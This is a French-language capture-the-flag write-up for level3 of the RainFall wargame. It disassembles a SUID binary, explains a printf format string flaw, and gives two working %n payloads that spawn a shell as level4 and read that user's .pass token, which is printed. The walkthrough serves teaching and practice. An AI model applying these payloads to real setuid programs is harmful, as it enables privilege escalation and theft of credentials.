# LEVEL3

Le systeme de fichier se présente de cette manière:

``` bash
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

Le fichier `level3` est un exécutable.

Le bit `SUID` est activé, l'utilisateur `level3` peut exécuter le programme avec les droits de `level4`.

En affichant le code assembleur du main avec `gdb` on découvre un appel à la fonction `v`:

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
```

Le code désassemblé de la fonction `v` se présente de cette manière:

``` bash
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860                # probablement stdin mis dans eax
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax         # esp+0x8 = stdin
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200       # esp+0x4 = 512 (decimal)
   0x080484be <+26>:	lea    eax,[ebp-0x208]                 # eax = ebp - 520 (decimal)
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax             # 
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>           
   0x080484cc <+40>:	lea    eax,[ebp-0x208]                 # on met dans eax le buffer situe a ebp-0x208
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax             # on fait pointer esp vers eax pour l'arg de printf
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c                # on met la valeur pointee par 0x804988c  dans eax
   0x080484df <+59>:	cmp    eax,0x40                        # if eax == 64
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```


On comprend d'après le code assembleur que le programme alloue sur la stack une variable locale de 520 octets qui sert de buffer pour `fgets()`. La fonction `fgets()` est présentée de cette manière par le man "fgets() lit au plus size - 1 caractères depuis stream et les place dans le tampon pointé par s. La lecture s'arrête après EOF ou un retour chariot. Si un retour chariot (newline) est lu, il est placé dans le tampon. Un octet nul (« \0 ») final est placé à la fin de la ligne." 

Ici la fonction `fgets()` lit au maximum jusqu'à sizeof(buffer) - 1, soit 511 caractères, ce qui, comparé aux 520 octets alloués pour le buffer, exclut tout risque de dépassement classique par buffer overflow.

La faille réside dans l'utilisation de `printf()` dont le seul argument est le buffer. On va donc exploiter une vulnérabilité de type format string. C'est une faille où une chaine fournie par l'utilisateur est passée directement comme argument de format à une fonction de la famille `printf`, permettant de lire `%x`, `%s` ou d'écrire (`%n`) en mémoire au-delá des arguments normalement attendus par la fonction.

Ensuite, à `v+59` on compare la valeur pointée par l'adresse `0x804988c` avec `0x40` (`64` en décimal).
A `v+62`, si cette valeur n'est pas égale on `jump` à `v+116`, et on quitte la fonction avec `leave` et `ret`.
Si la valeur à `0x804988c` est égale à `0x40`, alors on rentre dans le bloc d'instruction qui va executer un `fwrite()` puis un appel système avec "/bin/sh" comme argument.

On peut le déduire en inspectant les données aux adresses `0x8048600` (`v+71`) et `0x804860d` (`v+104`) qui sont mises dans les valeurs pointées par `esp` pour être passées en argument de `fwrite()` puis de `system()`

``` bash
(gdb) x/2s 0x8048600
0x8048600:	 "Wait what?!\n"
0x804860d:	 "/bin/sh"
```

On va donc utiliser `printf` pour inspecter la pile et modifier la valeur pointée par `0x804988c` afin qu'elle corresponde à 64 octets.
Pour ce faire on va utiliser le format de string `%x` pour calculer à quelle place se trouve l'argument de printf.
`%x` affiche une valeur en hexa se situant sur la pile, dans un ordre ascendant, chaque utilisation successive de `%x` va lire des données successives sur 4 octets. 

``` bash
level3@RainFall:~$ echo $(python2 -c 'print("AAAA" + "%x-" *7)') | ./level3
AAAA200-b7fd1ac0-b7ff37d0-41414141-252d7825-78252d78-2d78252d-
```

Avec cet exploit, on comprend que l'argument donné à notre printf, commence à la 4eme position, cette deniere affichant la valeur en hexa des 4 "A".

Notre but va être de donner a printf l'adresse de `0x804988c` et d'aller modifier la valeur surlaquelle elle pointe avec le format de string `%n`. Le spécificateur `%n`n'affiche pas une valeur mais écrit en mémoire à l'adresse pointée par l'argument correspondant le nombre d'octets déjà affichés par `printf` jusqu'à ce point. C'est ce qui permet décrire de manière arbitraire en mémoire.

Avant modification la valeur pointée par `0x804988c` correspond à 0 :

``` bash
(gdb) x/d 0x804988c
0x804988c <m>:	0
```

Et comme on l'a vu à `v+59`, le programme compare la valeur ciblée à `0x40` (64 en décimal). On va donc construire un exploit qui écrit 64 octets à l'adresse pointée par `0x804988c`.

On a aussi démontré que le 4ème argument lu par printf correspond aux 4 premiers octets de notre propre buffer. Il suffit donc de placer l'adresse cible (`0x804988c`) en tout début de la chaîne pour que `%4$n` écrive directement à cette adresse.

Voici notre exploit:

``` bash
level3@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x8c\x98\x04\x08" + "A"*60 + "%4$n")')) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
```

On peut le décomposer de cette manière:
- `"\x8c\x98\x04\x08"` : ecriture en little endian de l'adresse (4 octets)
- `"A"*60` : ecriture de 60 octets
- `"%4$n"` : on cible le 4ème mots lut par printf et on modifie la valeur sur laquelle il pointe par le nombre d'octets écrits jusque là.


Une deuxième manière d'écrire notre exploit consiste à utiliser `"%60d%4$n"` :

``` bash 
level3@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x8c\x98\x04\x08" + "%60d%4$n")')) | ./level3
�                                                         512
Wait what?!
```

Ici `%60d` cible l'argument suivant disponible sur la pile (ici `512`), et pad l'affichage de cette valeur avec des espaces jusqu'à occuper une largeur totale de 60 caractères, combiné aux 4 octets de l'adresse déjà affichés, cela porte le compteur total à `4 + 60 = 64` au moment où `%4n` s'exécute.

On entre ensuite dans le subshell, on vérifie l'euid avec la commande `id` et on récupère le token :

``` bash
id 
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

